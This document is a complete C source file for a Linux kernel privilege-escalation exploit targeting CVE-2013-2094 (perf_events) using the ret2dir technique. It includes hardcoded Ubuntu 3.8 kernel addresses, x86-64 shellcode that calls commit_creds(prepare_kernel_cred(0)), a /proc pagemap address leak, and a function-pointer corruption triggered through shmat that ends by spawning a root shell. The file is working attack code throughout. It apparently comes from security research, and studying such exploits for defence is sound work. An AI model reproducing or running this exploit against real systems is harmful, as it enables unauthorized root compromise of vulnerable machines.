/*
 * Linux kernel exploit (privilege escalation)
 * CVE-2013-2094 (PERF_EVENTS)
 * Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 *
 * Based on the exploits of `sd', `sorbo', and `spender';
 * uses the `ret2dir' technique for bypassing:
 * 	- SMEP+SMAP		(Intel)
 * 	- KERNEXEC/UDEREF	(PaX)
 *
 * Tested on Ubuntu 3.8.0-19-generic*, 3.8.0-pax (amd64)
 *
 * NOTE(s):
 * 	- set `PAGE_OFFSET', `KERN_HIGH', `KERN_NX_START',
 * 		and `KERN_NX_END' accordingly
 */

#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <linux/perf_event.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PAGE_SIZE	4096			/* page size (4KB)	*/
#define	ALLOC_STEP	PAGE_SIZE*1024*128	/* 512MB memory chunk	*/
#define	FILE_NR_PATH	"/proc/sys/fs/file-nr"
#define	KEY_MAGIC	0x19042002		/* key for shmget()	*/
#define	FD_MIN		3			/* first available fd	*/

static unsigned int	fd_max;			/* max fd (per process) */
static unsigned int	psig = 0;		/* signal delivered	*/

static unsigned long	map_addr, map_addrs;

/* pagemap query result (see querypmap()) */
struct pmap_qres {
	unsigned long	btarget;	/* branch target 	*/
	size_t		pnum;		/* page number 		*/
	int		status;		/* valid result? (>0)	*/
};

#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer	*/
#define PAGE_OFFSET	0xffff880000000000UL	/* kernel space		*/
#define	KERN_LOW	PAGE_OFFSET		/* range start		*/
#define KERN_HIGH	0xffff880080000000UL	/* range end		*/
#define	KERN_NX_START	0xffff880036000000UL	/* NX range start	*/
#define	KERN_NX_END	KERN_HIGH		/* NX range end		*/

/* Ubuntu 3.8.0-19-generic */
	/* 
	 * `perf_swevent_enabled[]' is located at 0xffffffff81ef7180;
	 * &perf_swevent_enabled[PERF_ARR_INDX] = &apparmor_ops.shm_shmat
	 * (0xffffffff81c71aa8)
	 */
#define	PERF_ARR_ADDR	0xffffffff81ef7180	/* `&perf_swevent_enabled'   */
#define	SHM_SHMAT_ADDR	0xffffffff81c71aa8	/* `&apparmor_ops.shm_shmat' */
#define	PERF_ARR_INDX	0xfffffffffffe51b7
#define	GAD_ESCAPE	0xffffffff81304e62	/* call *%rsi		*/
#define	CAP_SHM_SHMAT	0xffffffff812db050	/* `&cap_shm_shmat()'	*/
#define	INC_CNT		(GAD_ESCAPE - CAP_SHM_SHMAT)

#define	COMMIT_CREDS	0xffffffff810865f0	/* `&commit_creds()'	    */
#define PREP_KERN_CRED	0xffffffff81086870	/* `&prepare_kernel_cred()' */
#define SHELL_PREFIX	9		/* 9 bytes of "prefix" code	*/
#define SHELL_SUFFIX	24		/* 24 bytes of "suffix" code	*/
#define	SHELL_ADV	3		/* 3 bytes of code advancement	*/
static char shell_tmpl[] =
		"\x58"			/* pop	%rax		*/
		"\x55"			/* push	%rbp		*/
		"\x48\x89\xe5"		/* mov	%rsp, %rbp	*/
		"\x53"			/* push	%rbx		*/
		"\x48\xc7\xc3"		/* mov	$<kaddr>, %rbx	*/
		"\x48\xc7\xc0"		/* mov	$<kaddr>, %rax	*/
	"\x48\xc7\xc7\x00\x00\x00\x00"	/* mov	$0x0, %rdi	*/
		"\xff\xd0"		/* callq *%rax		*/
		"\x48\x89\xc7"		/* mov	%rax, %rdi	*/
		"\xff\xd3"		/* callq *%rbx		*/
	"\x48\xc7\xc0\x00\x00\x00\x00"	/* mov	$0x0, %rax	*/
		"\x5b"			/* pop	%rbx		*/
		"\xc9"			/* leaveq		*/
		"\xc3";			/* ret			*/


/*
 * query the pagemap
 *
 * open /proc/<pid>/pagemap and try to find the 1st page from a range of
 * user space pages that has a synonym inside [KERN_LOW, KERN_HIGH]
 * (i.e., in the direct-mapped RAM region in kernel space)
 *
 * @pid:	the pid of the process that we are interested into
 * @vaddr:	starting virtual address (page-aligned)
 * @psize:	page size
 * @pnum:	number of pages in the range
 * returns:	a `struct pmap_qres' (i.e., the kernel address of a vaddr,
 * 			or 0 if no vaddr is kernel-mapped/present, and the
 * 			page number for vaddr)
 */
static struct pmap_qres
querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
	/* path in /proc 	*/
	char 			path[PATH_SZ];

	/* pagemap entries	*/
	uint64_t 		*pentry	= NULL;

	/* pagemap file		*/
	FILE 			*fp	= NULL;

	/* return value		*/
	struct pmap_qres 	rval	= {0, 0, 1};

	/* helper */
	unsigned long 		kaddr	= 0;

	
	/* initialize the pagemap entries */
	if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL) {
		/* failed */
		printf("[-] failed to allocate memory for pagemap "	\
				"entries (%s), aborting!\n",
				strerror(errno));
		rval.status = -1;
		return rval;
	}

	/* cleanup */
	memset(path, 0, PATH_SZ);

	/* format the path variable */
	if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ) {
		/* failed */
			printf("[-] failed to set the path for "	\
				"/proc/%d/pagemap (%s), aborting!\n",
				pid,
				path);
		rval.status = -1;
		return rval;
	}
	
	/* open the pagemap file */
	if ((fp = fopen(path, "r")) == NULL) {
		/* failed */
		printf("[-] failed to open %s (%s), aborting!\n",
				path,
				strerror(errno));
		rval.status = -1;
		return rval;
	}

	/* seek to the appropriate place */
	if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1) {
		/* failed */
		printf("[-] failed to seek in pagemap (%s), aborting!\n",
				strerror(errno));
		rval.status = -1;
		return rval;
	}

	/* read the corresponding pagemap entries */
	if (fread(pentry, sizeof(uint64_t), pnum, fp) < 0) {
		/* failed */
		printf("[-] failed while reading "			\
				"pagemap entries (%s), aborting!\n",
			strerror(errno));
		rval.status = -1;
		return rval;
	}
	
	/* iterate the pagemap entries */
	vaddr += ((pnum - 1) * psize);
	while (pnum > 0) {
		/* check the present bit */
		if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
			/* page not present or invalid PFN */
			printf("\r[*] %#lx is not present in low memory  ",
	                                         vaddr);

			/* proper accounting */
			kaddr	= 0;
			vaddr	-= psize;
			pnum--;
			
			/* continue with the next page */	
			continue;
		}

		/* get the kernel-mapped address of vaddr */
		kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize)	+
			PAGE_OFFSET 				+
			(vaddr & (psize - 1));

		/* verbose */
		printf("\r[?] %#lx is kernel-mapped at %#lx",
				vaddr,
				kaddr);
		
		/* valid match ? */
		if (kaddr >= KERN_LOW && kaddr <= KERN_HIGH &&
			(kaddr < KERN_NX_START || kaddr > KERN_NX_END)) 
			/* yeah baby */
			break;

		/* proper accounting */
		kaddr	= 0;
		vaddr	-= psize;
		pnum--;
	}

	/* cleanup */
	fclose(fp);
	printf("\n");
	
	/* prepare the query result and return */
	rval.btarget	= kaddr;
	rval.pnum	= pnum - 1;
	return rval;
}

/*
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their synonyms fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding a user page whose directly-mapped counterpart falls
 * 		inside a RW(X) region in kernel (e.g., say 0x7f77e5bf3000 is
 * 		directly-mapped at 0xffff880001c00000), we copy the respective
 * 		data structures to the user pages, thus making them available to
 * 		kernel space as well (via their synonym pages in the
 * 		direct-mapped region)
 *
 * returns:	1 on success, or 0 if the whole memory (RAM) is exhausted and no
 * 		proper synonym pages were found
 */
static int
map_synonym(void)
{
	struct 	pmap_qres res	= {0, 0, 0};	/* kernel-level address of the
						tampered-with data structure */


	/* allocate ALLOC_STEP bytes in user space */
	if ((map_addr = (unsigned long)mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 
			-1,
			0)) == (unsigned long)MAP_FAILED) {
		/* failed */
		printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
		return 0;
	}

	/* see if user space is kernel-mapped */
	res = querypmap(getpid(),
			map_addr,
			PAGE_SIZE,
			ALLOC_STEP / PAGE_SIZE);

	/* sanity checking (invalid result) */
	if (res.status == -1)
		return 0;

	/* bad luck; try again */
	while (res.btarget == 0) {
		/* allocate ALLOC_STEP bytes in user space */
		if ((map_addr = (unsigned long)mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == (unsigned long)MAP_FAILED) {
			/* failed */
			printf("[-] failed to mmap memory (%s), aborting!\n",
				strerror(errno));
				return 0;
			}
	
		/* see if user space is kernel-mapped */
		res = querypmap(getpid(),
				map_addr,
				PAGE_SIZE,
				ALLOC_STEP / PAGE_SIZE);
	
		/* sanity checking (invalid result) */
		if (res.status == -1)
			return 0;
	}

	/* update the globals */
	map_addr += res.pnum * PAGE_SIZE;
	map_addrs = res.btarget;
	
	/* paranoid */
	if (mlock((void *)map_addr, PAGE_SIZE) == -1) {
		/* failed */
		printf("[-] failed to lock memory (%s), aborting!\n",
			strerror(errno));
		return 0;
	}

	/* success */
	return 1; 
}

/* CVE-2013-2094: invoke `perf_swevent_init()' with bogus input */
static int
perf_open(void)
{
	struct perf_event_attr attr;


	memset(&attr, 0, sizeof(attr));

	attr.type		= PERF_TYPE_SOFTWARE;
	attr.size		= sizeof(attr);
	attr.config		= PERF_ARR_INDX;/* &apparmor_ops.shm_shmat */
	attr.mmap		= 1;
	attr.comm		= 1;
	attr.exclude_kernel	= 1;
  
	/* apparmor_ops.shm_shmat++ */
	return syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
}

/* check is enough (global) file descriptors are available */
static int
fds_ok(void)
{
	unsigned long	used_fds = 0, max_fds = 0, scratch;
	FILE 		*fp = NULL;
	

	if ((fp = fopen(FILE_NR_PATH, "r")) == NULL) {
		/* failed */
		printf(	"[-] failed while trying to open `%s' -- (%s)\n",
			FILE_NR_PATH,
			strerror(errno));
		return -1;
	}

	fscanf(fp, "%lu\t%lu\t%lu\n", &used_fds, &scratch, &max_fds);
	
	fclose(fp);

	return ((max_fds - used_fds) >= INC_CNT) ? 1 : 0;
}

/* check if we can spawn enough child processes */
static int
procs_ok(void)
{
	long int	nofile = 0, nproc = 0, nchildren = 0;
	struct		rlimit rl;
	ldiv_t		div_res;


	if (getrlimit(RLIMIT_NOFILE, &rl) == -1) {
		/* failed */
		printf(	"[-] failed while trying to read limit `%s' -- (%s)\n",
			"RLIMIT_NOFILE",
			strerror(errno));
		return -1;
	}
	
	nofile	= rl.rlim_cur;
	fd_max	= rl.rlim_cur;

	if (getrlimit(RLIMIT_NPROC, &rl) == -1) {
		/* failed */
		printf(	"[-] failed while trying to read limit `%s' -- (%s)\n",
			"RLIMIT_NPROC",
			strerror(errno));
		return -1;
	}
	
	nproc = rl.rlim_cur;

	div_res = ldiv(INC_CNT, nofile);
	nchildren = div_res.quot;

	if (div_res.rem != 0)
		nchildren++;

	return (nproc >= nchildren) ? 1 : 0;
}

static void
shndl(int signum) { psig = 1; }

int
main(int argc, char **argv)
{
	int		res, i, j, k = 0, shmid = -1;
	ldiv_t		div_res;
	pid_t		*cpids	= NULL;
	int		*sarr	= MAP_FAILED;
	unsigned long	caddr	= COMMIT_CREDS;
	unsigned long	paddr	= PREP_KERN_CRED;
	char		varr[]	= {'|', '/', '-', '\\'};


	/* verbose */
	printf("[^] Linux kernel `PERF_EVENTS' (CVE-2013-2094) exploit\n");
	printf("    by Vasileios P. Kemerlis (vpk)\n");

	printf(	"[+] `perf_swevent_enabled[]' is located at 0x%lx\n",
		PERF_ARR_ADDR	);
	printf(	"[+] `&apparmor_ops.shm_shmat' is located at 0x%lx\n",
		SHM_SHMAT_ADDR	);
	printf(	"[+] `perf_swevent_enabled[0x%lx]=&apparmor_ops.shm_shmat'\n",
		PERF_ARR_INDX	);
	printf(	"[+] `apparmor_ops.shm_shmat=0x%lx'\n",
		CAP_SHM_SHMAT	);
	printf(	"[+] target address is 0x%lx (diff: 0x%lx)\n",
		GAD_ESCAPE,
		INC_CNT	);

	printf(	"[?] check if we have (at least) %lu "	\
		"(0x%lx) file descriptors available\n",
		INC_CNT, INC_CNT);

	/* sanity checking; see if enough file descriptors are available */
	switch((res = fds_ok())) {
		case -1:	/* probe failed */
			goto err;

		case 0:		/* not enough (global) file descriptors */
			printf(	"[-] not enough file descriptors (< %lu)\n",
				INC_CNT);
			goto err;

		case 1:		/* done; proceed */
		default:
			break;
	}
	
	printf(	"[?] check if we can spawn enough child processes\n");

	/* sanity checking; see if we can spawn enough child processes */
	switch((res = procs_ok())) {
		case -1:	/* probe failed */
			goto err;

		case 0:		/* not enough child processes can be spawned */
			printf("[-] can't spawn enough child processes\n");
			goto err;

		case 1:		/* done; let's go */
		default:
			break;
	}

	/* estimate the child processes needed */
	div_res = ldiv(INC_CNT, fd_max);

	/* allocate space for their PIDs */
	if ((cpids = calloc(div_res.quot, sizeof(pid_t))) == NULL) {
		printf(	"[-] calloc() failed -- (%s)\n",
			strerror(errno));
		goto err;
	}

	/* allocate space for the status array (shared) */
	if ((sarr = mmap(	NULL,
				sizeof(int) * div_res.quot,
				PROT_READ | PROT_WRITE,
				MAP_SHARED | MAP_ANONYMOUS,
				-1,
				0)) == MAP_FAILED) {
		printf(	"[-] mmap() failed -- (%s)\n",
			strerror(errno));
		goto err;
	}

	/* register the signal handler */
	signal(SIGTERM, shndl);

	/* spawn the child processes */
	for (i = 0; i < div_res.quot; i++) {
		switch(cpids[i] = fork()) {
			case -1:	/* failed */
				printf(	"[-] fork() failed -- (%s)\n",
					strerror(errno));
				goto err;

			case 0:		/* child process */
				/* cleanup (child PIDs) */
				free(cpids);

				/* cleanup (open file descriptors) */
				for (j = 0; j < fd_max; j++)
					close(j);

				/* invoke `perf_swevent_init()' */
				for (j = 0; j < fd_max; j++)
					perf_open();

				/* signal the parent */
				sarr[i] = 1;

				/* wait until the parent is done */
				while(!psig)
					sleep(1);

				/* invoke `perf_swevent_destroy()' */
				for (j = 0; j < fd_max; j++)
					close(j);

				/* cleanup (unnecessary crap) */
				munmap(sarr, sizeof(int) * div_res.quot); 

				/* done; success */
				return EXIT_SUCCESS;

			default:	/* parent process */
				printf(	"\r[%c] forking %lu processes...",
					varr[i % sizeof(varr)],
					div_res.quot	);
				break;
		}
	}
	
	printf("\r[+] forking %lu processes...(done)\n", div_res.quot);
	
	/* wait for the child processes to complete (busy wait) */	
again:
	for (i = 0; i < div_res.quot; i++) {
		printf(	"\r[%c] invoking `%s' x%lu...",
			varr[k++ % sizeof(varr)],
			"perf_swevent_init()",
			INC_CNT	);
		if (sarr[i] == 0)
			goto again;
	}

	/* final nits */
	for (i = 0; i < div_res.rem; i++)
		perf_open();
	
	printf(	"\r[+] invoking `%s' x%lu...(done)\n",
		"perf_swevent_init()",
		INC_CNT	);
	printf("[+] try to map a proper synonym page\n");
	
	/* map a synonym page */
	if (!map_synonym())
		/* failed */
		goto err;

	printf(	"[+] shellcode stitching (0x%lx <-> 0x%lx)\n",
		map_addr,
		map_addrs	);

	/* shellcode stitching */
	memcpy((char *)map_addr, shell_tmpl, SHELL_PREFIX);
		map_addr += SHELL_PREFIX;
	memcpy((char *)map_addr, &caddr, sizeof(unsigned));
		map_addr += sizeof(unsigned);
	memcpy((char *)map_addr, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
		map_addr += SHELL_ADV;
	memcpy((char *)map_addr, &paddr, sizeof(unsigned));
		map_addr += sizeof(unsigned);
	memcpy((char *)map_addr, &shell_tmpl[SHELL_PREFIX + SHELL_ADV],
		SHELL_SUFFIX);

	printf("[+] elevate privileges (w/out touching user space)\n");

	/* w00t */
	if ((shmid = shmget(KEY_MAGIC, PAGE_SIZE, IPC_CREAT | 0666)) == -1) {
		/* failed */
		printf(	"[-] shmget() failed -- (%s)\n",
			strerror(errno));
		goto err;
	}

	/* trigger the shellcode */
	shmat(shmid, (void *)map_addrs, 0);
	
	/* cleanup */
	for (i = 0; i < div_res.quot; i++) {
		printf(	"\r[%c] invoking `%s' x%lu...",
			varr[i % sizeof(varr)],
			"perf_swevent_destroy()",
			INC_CNT	);
		kill(cpids[i], SIGTERM);
		waitpid(cpids[i], NULL, 0);
	}
	for (i = 0; i < div_res.rem; i++)
		close(i + FD_MIN);

	printf(	"\r[+] invoking `%s' x%lu...(done)\n",
		"perf_swevent_destroy()",
		INC_CNT	);

	free(cpids);
	munmap(sarr, sizeof(int) * div_res.quot);
	shmctl(shmid, IPC_RMID, NULL);

	/* w00t? */
	if (getuid()) {
		printf("[-] exploit failed to get root\n");
		return EXIT_FAILURE;
        }

	printf("[*] Got r00t!\n");
	execl("/bin/sh", "sh", NULL);

	/* done; success */
	return EXIT_SUCCESS;

err:
	/* cleanup */
	if (cpids != NULL) {
		for (i = 0; i < div_res.quot; i++) {
			if (cpids[i] != 0) {
				kill(cpids[i], SIGTERM);
				waitpid(cpids[i], NULL, 0);
			}
		}
		for (i = 0; i < div_res.rem; i++)
			close(i + FD_MIN);

		free(cpids);

		if (sarr != MAP_FAILED)
			munmap(sarr, sizeof(int) * div_res.quot);

		if (shmid != -1)
			shmctl(shmid, IPC_RMID, NULL);
	}

	/* done; failure */
	return EXIT_FAILURE;
}
